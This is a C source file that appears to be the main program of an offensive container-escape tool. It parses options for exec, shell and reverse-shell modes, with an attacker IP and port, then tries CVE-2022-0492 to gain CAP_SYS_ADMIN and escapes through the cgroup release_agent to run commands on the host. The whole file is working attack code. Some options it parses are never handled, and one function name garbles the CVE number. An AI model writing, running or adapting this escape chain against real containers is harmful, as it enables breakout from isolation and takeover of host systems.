#define _GNU_SOURCE

#include "docker/capability.h"
#include "payloads/cve_2022_0492.h"
#include <time.h>
#include <stdlib.h>
#include <string.h>
#include "util/output.h"
#include "util/program_info.h"
#include "docker/path.h"
#include "payloads/release_agent.h"
#include "util/regex_util.h"
#include "util/custom_struts.h"
#include <getopt.h>


int main(int argc, char *argv[]) {

    srand(time(NULL));
    static const struct option opts[] = {
            {"help",          no_argument,       NULL, 'h'},
            {"version",       no_argument,       NULL, 'v'},
            {"auto-escape",   no_argument,       NULL, 'a'},
            {"release-agent", no_argument,       NULL, 'r'},
            {"devices-allow", no_argument,       NULL, 'd'},
            {"path",          required_argument, NULL, 'p'},
            {"mode",          required_argument, NULL, 'm'},
            {"command",       required_argument, NULL, 'c'},
            {"ip",            required_argument, NULL, 'I'},
            {"port",          required_argument, NULL, 'P'},
            {"bash",          no_argument,       NULL, 'b'}
    };
    int opt;
    attack_info.attack_mode = -1;
    attack_info.command = (char *) malloc(512 * sizeof(char));
    memset(attack_info.command, 0x00, 512);
    attack_info.attack_type = -1;
    attack_info.ip = (char *) malloc(64 * sizeof(char));
    memset(attack_info.ip, 0x00, 64);
    attack_info.port = -1;
    const char *opt_type = "hvardp:m:c:I:P:b";
    while ((opt = getopt_long_only(argc, argv, opt_type, opts, NULL)) != -1) {
        switch (opt) {
            case 'h':
                usage(argv[0]);
                break;
            case 'v':
                print_version();
                break;
            case 'r':
                attack_info.attack_type = RELEASE_AGENT;
                break;
            case 'c':
                attack_info.command = optarg;
                break;
            case 'm':
                if (strcmp(optarg, "exec") == 0) {
                    attack_info.attack_mode = EXEC;
                } else if (strcmp(optarg, "shell") == 0) {
                    attack_info.attack_mode = SHELL;
                } else if (strcmp(optarg, "reverse") == 0) {
                    attack_info.attack_mode = REVERSE;
                } else {
                    printf_wrapper(ERROR, "Unknown attack mode -m support {exec | shell | reverse}\n");
                    exit(EXIT_SUCCESS);
                }
                break;
//            default:
//                usage(argv[0]);
//                break;
        }
    }

    if (attack_info.attack_type == -1 || attack_info.attack_mode == -1) {
        printf_wrapper(ERROR, "Args set error, args of escape and -m must set\n");
        exit(EXIT_SUCCESS);
    }
    if (attack_info.attack_mode == EXEC && attack_info.command[0] == 0x00) {
        printf_wrapper(ERROR, "In exec mode, -c must be set and can't be empty\n");
        exit(EXIT_SUCCESS);
    }
    if (attack_info.attack_mode == REVERSE && (attack_info.ip[0] == 0x00 || attack_info.port == -1)) {
        printf_wrapper(ERROR, "In reverse mode, -I and -P must set\n");
        exit(EXIT_SUCCESS);
    }
    switch (attack_info.attack_type) {
        case RELEASE_AGENT: {
            int sys_admin = check_cap_sys_admin();
            if (sys_admin == 0) {
                printf_wrapper(INFO, "Try to use CVE-2022-0492 to get CAP_SYS_ADMIN\n");
                int result = cve_2022_0294();
                if (result == 0) {
                    return 0;
                } else {
                    printf_wrapper(INFO, "Try to get container path in host\n");
                    char *container_path_in_host = (char *) malloc(1024 * sizeof(char));
                    get_container_path_in_host(container_path_in_host);
                    escape_by_release_agent(container_path_in_host);
                }
            } else {
                printf_wrapper(INFO, "Try to get container path in host\n");
                char *container_path_in_host = (char *) malloc(1024 * sizeof(char));
                memset(container_path_in_host, 0x00, 1024 * sizeof(char));
                get_container_path_in_host(container_path_in_host);
                escape_by_release_agent(container_path_in_host);
            }
            break;
        }
    }
}
